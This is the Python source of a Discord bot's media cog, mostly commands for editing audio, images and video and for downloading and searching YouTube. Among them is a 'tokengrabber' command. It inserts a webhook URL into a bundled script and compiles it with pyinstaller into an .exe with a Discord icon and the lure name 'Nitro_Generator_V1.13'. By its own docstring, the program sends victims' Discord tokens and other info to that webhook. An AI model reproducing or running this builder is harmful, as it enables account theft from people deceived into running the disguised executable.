# -*- coding: utf-8 -*-
import glob
import inspect
import os
import subprocess
from io import BytesIO
from pathlib import Path
from tempfile import NamedTemporaryFile, TemporaryDirectory
from typing import List, Optional

import youtube_dl
from discord import Attachment, Colour, File, Message, PremiumType
from discord.ext import commands
from pydub import AudioSegment
from youtubesearchpython import VideosSearch

from .utils import flags
from .utils.checks import bot_has_permissions, check_ffmpeg
from .utils.converters import (CountryConverter, ImageConverter,
                               LanguageConverter)
from .utils.effects import (adjustspeed_, ascii_, bonk_, bounce_, breathe_,
                            caption_, deepfry_, explode_, fade_, glitch_, pet_,
                            reverse_, revolve_, rotatehue_, shake_, shine_,
                            spin_, stretch_, typeout_)
from .utils.enums import WebmEditType
from .utils.exceptions import BytesNotFound, DataNotFound

SP_OPTS = {
    'check': True,
    'stdout': subprocess.DEVNULL,
    'stderr': subprocess.STDOUT
}


class Media(commands.Cog):
    '''Category with all the media commands. These are usually more advanced image/gif/video/audio editing commands'''

    def __init__(self, bot):
        self.bot = bot


    @staticmethod
    def _get_upload_limit(ctx) -> int:
        premium = ctx.bot.user.premium_type
        if premium == PremiumType.nitro:
            limit = 104857600 # 100Mb
        elif premium == PremiumType.nitro_classic:
            limit = 52428800 # 50Mb
        else:
            limit = 8388608 # 8Mb
        if ctx.guild:
            if ctx.guild.filesize_limit > limit:
                limit = ctx.guild.filesize_limit
        return limit


    @staticmethod
    async def _get_files(ctx, message_ids: List[int]) -> List[Optional[Attachment]]:
        return [
            m.attachments[0] for m in 
            [await ctx.channel.fetch_message(_id) for _id in message_ids]
            if m.attachments
        ]


    @staticmethod
    async def _edit_video(ctx, edit_type: WebmEditType, link: str = None) -> None:
        await ctx.bot.log('Editing video... (this may take a while)', 'info')
        try:
            im = link or ctx.message.attachments[0]
        except IndexError:
            raise commands.MissingRequiredArgument(inspect.Parameter('link', 1))
        temp = NamedTemporaryFile(dir=Path('data/temp'), mode='wb+', delete=False)
        tempout = NamedTemporaryFile(dir=Path('data/temp'), delete=False)
        if isinstance(im, Attachment):
            await im.save(temp.name)
        elif isinstance(im, str):
            b = await ctx.bot.get_bytes(im)
            temp.write(b)

        command = ['ffmpeg', '-i', temp.name, '-c:v', 'libvpx-vp9', '-crf', '30', '-b:v', '0', '-b:a', '128K', '-c:a', 'libopus', '-y', '-f', 'webm', tempout.name]
        try:
            subprocess.run(command, **SP_OPTS)
        except:
            raise FileNotFoundError('Couldn\'t convert video to webm, (is ffmpeg added to PATH?).')
        fp = bytearray(tempout.read())
        try:
            index = fp.index(b'\x44\x89\x88')
        except ValueError:
            raise BytesNotFound(f'The required bytes to {edit_type} the file weren\'t found.')

        if edit_type is WebmEditType.expand:
            fp[index + 3] = 63
            fp[index + 4] = 240
            for i in range(5, 11):
                fp[index + i] = 0

        elif edit_type is WebmEditType.negative:
            fp[index + 3] = 66
            fp[index + 4] = 255
            fp[index + 5] = 176
            fp[index + 6] = 96
            for i in range(7, 11):
                fp[index + i] = 0

        elif edit_type is WebmEditType.zero:
            for i in range(3, 11):
                fp[index + i] = 0

        await ctx.send(file=File(BytesIO(fp), f'{edit_type}.webm'))
        temp.close()
        os.unlink(temp.name)
        tempout.close()
        os.unlink(tempout.name)


    @bot_has_permissions(attach_files=True)
    @commands.max_concurrency(1, commands.BucketType.user)
    @commands.command(
        aliases=['generate_tokengrabber', 'gengrab', 'grabber'],
        usage='[webhook_url=old (if you haven\'t used this command already, provide a webhook url)] [filename=freenitro]'
    )
    async def tokengrabber(self, ctx, webhook_url: str = None, filename: str = 'Nitro_Generator_V1.13'):
        '''Will generate a .exe file which when ran, will send Discord tokens and other info to [webhook_url]'''
        fn = f'{filename}.exe'
        await self.bot.log(f'Generating {fn}... (this may take a while)', 'info')
        if webhook_url:
            with open(Path('data/assets/other/tokengrabber.py'), 'r+', encoding='utf-8') as f:
                script = f.readlines()
                script[12] = f'WEBHOOK_URL = \'{webhook_url}\'\n'
                f.seek(0)
                f.truncate(0)
                f.writelines(script)

        temp_dir = TemporaryDirectory(dir=Path('data/temp'))
        temp_path = Path(temp_dir.name)

        command = ['pyinstaller', Path('data/assets/other/tokengrabber.py'), '--onefile', '--specpath', temp_path, '--distpath', temp_path, '--workpath', temp_path, '--icon', Path(f'{os.getcwd()}/data/assets/images/discord_logo.ico')]
        subprocess.run(command, **SP_OPTS)
        await self.bot.log(f'Uploading {fn}... (this may take a while)', 'info')
        await ctx.send(file=File(Path(f'{temp_path}/tokengrabber.exe'), fn))

        try:
            temp_dir.cleanup()
        except PermissionError:
            pass


    @check_ffmpeg()
    @bot_has_permissions(attach_files=True)
    @flags.add_flag('--reverse', type=bool)
    @flags.add_flag('--remove')
    @flags.add_flag('--removesilence', type=bool)
    @flags.add_flag('--normalize', type=bool)
    @flags.add_flag('--pan', type=float)
    @flags.add_flag('--speed', type=float)
    @flags.add_flag('--overlay', type=int)
    @flags.add_flag('--volume', type=int)
    @flags.add_flag('--bitrate', default='192k')
    @flags.add_flag('--repeat', type=int)
    @flags.add_flag('--fadein', type=int)
    @flags.add_flag('--fadeout', type=int)
    @flags.add_flag('--lowpassfilter', type=int)
    @flags.add_flag('--highpassfilter', type=int)
    @flags.command(
        aliases=['audioedit'],
        usage='<filemessage> [--volume dB] [--reverse=None] [--fadein ms] [--fadeout ms] [--overlay messageid] [--repeat times] [--bitrate=192k Hz] [--pan dB] [--speed=1] [--removesilence=None] [--normalize=None] [--lowpassfilter Hz] [--highpassfilter Hz] [--remove ms (e.g "2000, 4000" to remove audio from 2 to 4s)]',
        brief='Media/editaudio'
    )
    async def editaudio(self, ctx, filemessage: int, **options):
        '''Will edit the <filemessage> with the given [options]'''
        attachment = (await self._get_files(ctx, [filemessage]))[0]
        if not attachment:
            raise DataNotFound(f'Couldn\'t find any attachments in {filemessage}')

        temp1, temp2 = NamedTemporaryFile(dir=Path('data/temp'), delete=False), None
        await attachment.save(temp1.name)
        seg = AudioSegment.from_file_using_temporary_files(temp1)

        if opt := options['remove']:
            begin, end = list(map(int, opt.split(',')))
            seg = seg[:begin] + seg[end:]
        if opt := options['overlay']:
            if overlay_seg := (await self._get_files(ctx, [opt])):
                temp2 = NamedTemporaryFile(dir=Path('data/temp'), delete=False)
                await overlay_seg.save(temp2.name)
                overlay_seg = AudioSegment.from_file_using_temporary_files(temp2)
                seg = seg.overlay(overlay_seg, loop=True)
        if opt := options['speed']:
            if opt < 1:
                seg = seg._spawn(
                    seg.raw_data,
                    overrides={
                        'frame_rate': int(seg.frame_rate * opt)
                    }
                ).set_frame_rate(seg.frame_rate)
            else:
                seg = seg.speedup(opt)
        if opt := options['highpassfilter']:
            seg = seg.high_pass_filter(opt)
        if opt := options['lowpassfilter']:
            seg = seg.low_pass_filter(opt)
        if options['removesilence']:
            seg = seg.strip_silence()
        if options['normalize']:
            seg = seg.normalize()
        if opt := options['repeat']:
            seg *= opt
        if options['reverse']:
            seg = seg.reverse()
        v, p = options['volume'], options['pan']
        if v and not p:
            seg += v
        if p and not v:
            seg = seg.pan(p)
        if opt := options['fadein']:
            seg = seg.fade_in(opt)
        if opt := options['fadeout']:
            seg = seg.fade_out(opt)

        tempout = NamedTemporaryFile(dir=Path('data/temp'), delete=False)
        seg.export(tempout, bitrate=options['bitrate'], format='mp3')
        await ctx.send(file=File(tempout.name, 'edited.mp3'))

        temp1.close()
        os.unlink(temp1.name)
        tempout.close()
        os.unlink(tempout.name)
        if temp2:
            temp2.close()
            os.unlink(temp2.name)

    
    @check_ffmpeg()
    @bot_has_permissions(attach_files=True)
    @commands.max_concurrency(1, commands.BucketType.user)
    @commands.command(
        aliases=['playtwice'],
        usage='[filemessages... (message ids of messages containing the audiofiles)] [filename=play_this_twice]',
        brief='Media/oggglitch'
    )
    async def oggglitch(self, ctx, filemessages: commands.Greedy[int], *, filename: str = 'play_this_twice'):
        '''Will send a .ogg file that plays the next in <filemessages> everytime it's played'''
        try:
            await ctx.bot.log('Editing ogg files... (this may take a while)', 'info')
            attachments = sorted(
                await self._get_files(ctx, filemessages),
                key=lambda item: item.size,
                reverse=True
            )

            if not attachments:
                raise DataNotFound(f"Couldn't find any attachments in `{', '.join(filemessages)}`.")

            files = []
            for i, at in enumerate(attachments):
                filetype = at.url.split('.')[-1]
                fn = fr'data\temp\temp_{i}.{filetype}'
                await at.save(fn)
                files.append((str(fn), filetype))

            converted_files = []
            for fn, filetype in files:
                new_fn = fn.replace(filetype, 'converted.ogg')
                command = ['ffmpeg', '-i', fn, '-vn', '-map_metadata', '-1', '-c:a', 'libvorbis', '-b:a', '64k', '-ar', '44100', new_fn]
                subprocess.run(command, **SP_OPTS)
                converted_files.append(new_fn)

            last = r'data\assets\other\default.ogg'
            for i, fn in enumerate(converted_files):
                dest = fr'data\temp\temp_{i}.final.ogg'
                command = ['copy', '/b', last, '+', fn, dest]
                subprocess.run(command, **SP_OPTS)
                last = dest

            await ctx.send(file=File(last, f'{filename}.ogg'))
        finally:
            for f in glob.glob('data/temp/*'):
                os.remove(f)


    @check_ffmpeg()
    @bot_has_permissions(attach_files=True)
    @flags.add_flag('--audioonly', '--audio-only', type=bool, default=False)
    @flags.add_flag('--quality')
    @flags.command(
        aliases=['downloadmedia', 'upload'],
        usage='<link> [--audioonly=False] [--quality=best uploadable ([supported qualities](https://github.com/ytdl-org/youtube-dl/blob/master/README.md#format-selection))]',
        brief='Media/download'
    )
    async def download(self, ctx, link: str, **options):
        '''Will upload the media from <link>, [supported websites](https://ytdl-org.github.io/youtube-dl/supportedsites.html)'''
        quality = options['quality'] or f'best[filesize<{self._get_upload_limit(ctx)}]/bestaudio/best'
        temp_dir = TemporaryDirectory(dir=Path('data/temp'))
        temp_path = Path(temp_dir.name)

        await self.bot.log(f'Downloading {link}... (this may take a while)', 'info')
        opts = {
            'quiet': True,
            'no_warnings': True,
            'noplaylist': True,
            'format': quality,
            'outtmpl': f'{temp_path}//%(id)s.%(ext)s'
        }
        if options['audioonly']:
            opts.update({
                'postprocessors': [{
                    'key': 'FFmpegExtractAudio',
                    'preferredcodec': 'mp3',
                    'preferredquality': '320'
                }]
            })

        meta = await self.bot.loop.run_in_executor(
            None,
            lambda: youtube_dl.YoutubeDL(opts).extract_info(
                link,
                download=True
            )
        )
        suffix = 'mp3' if options['audioonly'] else meta['ext']
        file_path = f"{temp_path}/{meta['id']}.{suffix}"
        await self.bot.log(f'Uploading {file_path}... (this may take a while)', 'info')
        await ctx.send(file=File(file_path, f"{meta['title']}.{suffix}"))

        try:
            temp_dir.cleanup()
        except PermissionError:
            pass


    @bot_has_permissions(attach_files=True)
    @flags.add_flag('--limit', type=int, default=5)
    @flags.add_flag('--language')
    @flags.add_flag('--country')
    @flags.add_flag('query', nargs='+')
    @flags.command(
        aliases=['youtube', 'youtubesearch'],
        usage='<query> [--country=US] [--limit=5] [--language=en]'
    )
    async def ytsearch(self, ctx, **options):
        '''Will search YouTube with <query> and send results'''
        language, country = 'en', 'US'
        if l := options['language']:
            language = (await LanguageConverter().convert(ctx, l)).alpha_2
        if c := options['country']:
            country = (await CountryConverter().convert(ctx, c)).alpha_2
        
        results = VideosSearch(
            ' '.join(options['query']),
            options['limit'],
            language,
            country
        ).result()
        msg = '\n'.join([d['link'] for d in results['result']])
        await ctx.send(msg)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['boom'])
    async def explode(self, ctx, link: ImageConverter):
        '''Will explode your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: explode_(b))
        await ctx.respond(image='attachment://explode.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['hop', 'jump'])
    async def bounce(self, ctx, link: ImageConverter, frame_duration: int = 50):
        '''Will bounce your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: bounce_(b, frame_duration))
        await ctx.respond(image='attachment://bounce.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command()
    async def breathe(self, ctx, link: ImageConverter, frame_duration: int = 50):
        '''Will add a breathe effect to <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: breathe_(b, frame_duration))
        await ctx.respond(image='attachment://breathe.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command()
    async def spin(self, ctx, link: ImageConverter, frame_duration: int = 64):
        '''Will spin your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: spin_(b, frame_duration))
        await ctx.respond(image='attachment://spin.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command()
    async def shake(self, ctx, link: ImageConverter, intensity: int = 10):
        '''Will shake your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: shake_(b, intensity))
        await ctx.respond(image='attachment://shake.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['fry'])
    async def deepfry(self, ctx, link: ImageConverter, intensity: int = 100):
        '''Will deepfry your <link>'''
        b = await self.bot.get_bytes(link)
        _file, ft = await self.bot.loop.run_in_executor(None, lambda: deepfry_(b, intensity))
        await ctx.respond(image=f'attachment://deepfry.{ft}', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command()
    async def fade(self, ctx, link: ImageConverter, frame_duration: int = 100):
        '''Will fade your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: fade_(b, frame_duration))
        await ctx.respond(image='attachment://fade.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['petpet'])
    async def pet(self, ctx, link: ImageConverter, intensity: float = 0.1):
        '''Will pet your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: pet_(b, intensity))
        await ctx.respond(image='attachment://pet.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['hit'])
    async def bonk(self, ctx, link: ImageConverter, frame_duration: int = 300):
        '''Will bonk your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: bonk_(b, frame_duration))
        await ctx.respond(image='attachment://bonk.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command()
    async def stretch(self, ctx, link: ImageConverter, frame_duration: int = 72):
        '''Will stretch your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: stretch_(b, frame_duration))
        await ctx.respond(image='attachment://stretch.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command()
    async def revolve(self, ctx, link: ImageConverter, frame_duration: int = 72):
        '''Will spin your <link> in the y-axis'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: revolve_(b, frame_duration))
        await ctx.respond(image='attachment://revolve.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['slowdown', 'speedup'])
    async def speed(self, ctx, link: ImageConverter, factor: float = 2):
        '''Will speed up or slow down your <link> with <factor>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: adjustspeed_(b, factor))
        await ctx.respond(image='attachment://speed.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['shimmer'])
    async def shine(self, ctx, link: ImageConverter, colour: Colour = None, frame_duration: int = 50):
        '''Will add a shine effect to your <link>'''
        colour = colour.to_rgb() if colour else (250, 250, 210)
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: shine_(b, frame_duration, colour))
        await ctx.respond(image='attachment://shine.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['rgb', 'disco'])
    async def huerotate(self, ctx, link: ImageConverter, frame_duration: int = 64):
        '''Will rotate hue in your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: rotatehue_(b, frame_duration))
        await ctx.respond(image='attachment://huerotate.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command()
    async def reverse(self, ctx, link: ImageConverter):
        '''Will reverse your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: reverse_(b))
        await ctx.respond(image='attachment://reverse.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @commands.command(aliases=['makememe', 'gifcaption', 'captiongif'])
    async def caption(self, ctx, link: ImageConverter, *, text: str):
        '''Will caption your <link> with <text>'''
        b = await self.bot.get_bytes(link)
        _file, ft = await self.bot.loop.run_in_executor(None, lambda: caption_(b, text))
        await ctx.respond(image=f'attachment://caption.{ft}', files=_file)


    @bot_has_permissions(attach_files=True)
    @flags.add_flag('--frameduration', type=int, default=128)
    @flags.add_flag('--rgb', type=bool, default=False)
    @flags.add_flag('--fontsize', type=int, default=30)
    @flags.add_flag('text', nargs='+')
    @flags.command(
        name='type',
        aliases=['animate', 'typeout'],
        usage='<text> [--frameduration=96] [--rgb=False] [--fontsize=30]'
    )
    async def _type(self, ctx, **options):
        '''Will type <text> as a gif'''
        _file = await self.bot.loop.run_in_executor(None, lambda: typeout_(
            ' '.join(options['text']),
            options['frameduration'],
            options['fontsize'],
            options['rgb']
        ))
        await ctx.respond(image='attachment://type.gif', files=_file)


    @bot_has_permissions(attach_files=True)
    @flags.add_flag('--scale', type=float, default=0.1)
    @flags.add_flag('--intensity', type=float, default=1.0)
    @flags.add_flag('--density', type=float, default=0.5)
    @flags.add_flag('--rgb', type=bool, default=False)
    @flags.command(
        aliases=['asciiart'],
        usage='<link> [--scale=0.2 (not recommended to go above 0.3)] [--intensity=1.0 (can only go lower than 1)] [--density=0.5] [--rgb=False (works only with gifs)]'
    )
    async def ascii(self, ctx, link: ImageConverter, **options):
        '''Will turn your <link> into ascii art'''
        b = await self.bot.get_bytes(link)
        _file, ft = await self.bot.loop.run_in_executor(None, lambda: ascii_(
            b,
            options['scale'],
            options['intensity'],
            options['density'],
            options['rgb']
        ))
        await ctx.respond(image=f'attachment://ascii.{ft}', files=_file)


    @bot_has_permissions(attach_files=True)
    @flags.add_flag('--colouroffset', '--coloroffset', type=bool, default=True)
    @flags.add_flag('--seed', type=int)
    @flags.add_flag('--glitchchange', type=float, default=0.0)
    @flags.add_flag('--scanlines', type=bool, default=False)
    @flags.add_flag('--step', type=int, default=1)
    @flags.add_flag('--cycle', type=bool, default=False)
    @flags.command(
        aliases=['glitchgif', 'glitchimage'],
        usage='<link> [glitchamount=2.0] [--colouroffset=True] [--seed] [--scanlines=False] [--step=1] [--glitchchange=0.0] [--cycle=False]'
    )
    async def glitch(self, ctx, link: ImageConverter, glitchamount: float = 2.0, **options):
        '''Will glitch your <link>'''
        b = await self.bot.get_bytes(link)
        _file = await self.bot.loop.run_in_executor(None, lambda: glitch_(
            b,
            glitchamount,
            options['seed'],
            options['glitchchange'],
            options['scanlines'],
            options['step'],
            options['colouroffset'],
            options['cycle']
        ))
        await ctx.respond(image='attachment://glitch.gif', files=_file)


    @commands.group(
        invoke_without_command=True,
        aliases=['glitchwebm', 'video'],
        brief='Media/webmglitch'
    )
    async def webmglitch(self, _):
        '''Group command for altering video files'''
        raise commands.CommandNotFound()

    @check_ffmpeg()
    @bot_has_permissions(attach_files=True)
    @webmglitch.command('expand', aliases=['increase'])
    async def webmglitch_expand(self, ctx, link: str = None):
        '''Will make it look like the duration of your <link> is expanding'''
        await self._edit_video(ctx, WebmEditType.expand, link)

    @check_ffmpeg()
    @bot_has_permissions(attach_files=True)
    @webmglitch.command('negative')
    async def webmglitch_negative(self, ctx, link: str = None):
        '''Will make it look like the duration of your <link> is negative'''
        await self._edit_video(ctx, WebmEditType.negative, link)

    @check_ffmpeg()
    @bot_has_permissions(attach_files=True)
    @webmglitch.command('zero')
    async def webmglitch_zero(self, ctx, link: str = None):
        '''Will make it look like the duration of your <link> is zero'''
        await self._edit_video(ctx, WebmEditType.zero, link)


def setup(bot):
    bot.add_cog(Media(bot))
